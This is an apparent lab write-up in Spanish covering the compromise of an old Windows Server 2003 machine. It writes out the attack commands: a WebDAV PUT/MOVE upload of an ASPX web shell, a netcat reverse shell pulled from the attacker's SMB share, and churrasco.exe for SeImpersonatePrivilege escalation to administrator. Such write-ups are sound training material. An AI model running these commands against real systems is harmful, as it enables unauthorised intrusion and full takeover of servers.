Acceso por WebDAV y escalada en un Windows Server antiguo.

WebDAV · Privilegios

Resultado documentado

El apunte confirma una shell como administrador.

Apuntes de la resolución

Texto adaptado desde mis apuntes de laboratorio. Las capturas no se incluyen en esta edición; algunos pasos remiten a ellas. El cierre se ha seleccionado por lo descrito en el texto, sin repetir técnicamente la explotación.

Al hacer el escaneo con nmap podemos ver que solo tenemos el puerto 80 abierto. Nmap nos informa de que tenemos un webDav disponible para interactuar con el.

Si bien ya nmap nos reporta los métodos los cuales podemos usar para explotar el webDav, vamos a usar la herramienta davtest para ver más información acerca del webDav.

La información que nos reporta es que las extensiones que se nos permite subir al servidor son txt y otra más, que en este caso no viene a cuento.

Ya que tiene las opciones PUT y MOVE habilitadas vamos a usarlas para subir un archivo malicioso que nos permita ejecutar comandos en la máquina objetivo.

Ya que sabemos que es un windows server del 2003 podemos intuir que el lenguaje aspx nos lo podría ejecutar, así que vamos a usar el binario .exe: cmdasp.aspx.

Con el siguiente comando conseguimos subir nuestro archivo: curl -X PUT http://ip_objetivo/cmdasp.txt -T cmdasp.aspx Básicamente subimos nuestro archivo con el parámetro -T pero lo renombramos a .txt para que se nos permita subir el archivo a la web. Si vamos a la ruta podemos ver como efectivamente podemos ver este archivo con la extensión txt pero sin ejecutarse nada.

Ahora con el siguiente comando conseguiremos cambiarle la extensión para que se ejecute: curl -X MOVE http://ip_objetivo/cmdasp.txt -H 'Destination:http://ip_objetivo/cmdasp.aspx'.

Si visitamos la ruta podemos ver que efectivamente tenemos una ruta para ejecutar comandos. Con esto mismo vamos a traernos el archivo nc.exe a nuestro directorio de trabajo y nos compartimos, con la herramienta impacket-smbserver smbFolder $(pwd) el cual básicamente significa que nos levantamos un servidor SMB con el recurso compartido a nivel de red smbFolder y con la parte $(pwd) le indicamos que es el directorio actual de trabajo.

Ahora ejecutamos en la casilla de comandos de la web lo siguiente: //mi_ip/smbFolder/nc.exe -e cmd mi_ip 443 y gracias a que nos pusimos en escucha desde otra ventana, esto nos hace que nos mande una reverse shell

Escalada de privilegios

Con el comando whoami /priv para ver que privilegios tenemos podemos ver que tenemos unos cuantos interesantes, pero en el que nos vamos a fijar es el privilegio seImpersonatePrivilege.

Existe el exploit JuicyPotato el cual funcionaría en estos casos, el problema es que el sistema es tan antiguo que no lo soporta, en este caso usaremos el exploit churrasco.exe. Aquí es donde podemos leer del problema que da https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/.

Nos compartimos el archivo churrasco.exe de igual manera con el servicio de impacket pero esta vez en la máquina objetivo añadiremos copy para traerlo a la máquina víctima.

Una vez en la máquina víctima ejecutaremos el siguiente comando: churrasco.exe "\\mi_ip\smbFolder\nc.exe -e cmd mi_ip 443".

Nos ponemos en escucha de nuevo y nos manda ya la shell como administradores.

Nota

Este sistema es tan antiguo que tiene otra distribución de carpetas. Los usuarios se encuentran en la raíz, en alldocuments
